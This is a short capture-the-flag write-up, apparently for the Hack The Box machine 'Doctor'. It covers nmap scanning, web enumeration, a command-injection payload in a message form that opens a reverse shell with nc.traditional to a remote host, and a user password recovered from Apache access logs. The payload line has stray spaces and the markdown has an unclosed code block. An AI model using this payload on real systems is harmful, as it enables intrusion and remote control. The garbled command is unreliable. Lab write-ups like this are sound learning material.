### 1. Service Scanning:

- Quick Pre-searching:

	```
	nmap -p- -T5 --min-rate=1000 10.10.10.209-oG fkclai.nmap
	```

- Details Analysis:

	![img](./img/3.png)

	```
	nmap -p $(grep -Eo '[0-9]{1,5}/open' fkclai.nmap | cut -d '/' -f 1 | tr -s '\n' ',') -sC -sV 10.10.10.209 -o nmap-result.txt
	```

- Enumeration strategies:
	1. Check Website Vulnerability  
	2. Check any hidden files/folders of the website
	3. Check the website

***
### 2. Enumeration:

Visit the website and read the page source, it was found that the doctor.htb should be included in the host table before further enumeration.

A login page was found by visiting the http://doctors.htb

Tried using gobuster and dirb to find another hidden fold, but the result is negative. Nikto also does not has any good news. 

Finally, registered a user account and enumerate the inside. It was found that there was an XSS vulnerability at the POST message form.

After several tried, this payload was used to get the reverse shell

```
< img  src = http://10.10.14.26:8888/$(nc.traditional$IFS-e$IFS/bin/bash$IFS ' 10.10.17.216 '$ IFS ' 6666 ')>
```

```

### 3. Gaining Foothold:

After the user account "Shaun" was found that saved the user.txt, focusing the enumeration of this account. Finally, visited the apache2 log, there was a password reset process of this account Shaun was found at the acess.log. The password of this user account **shaun** is **Guitar123**

sudo this user account, the user flag was found.
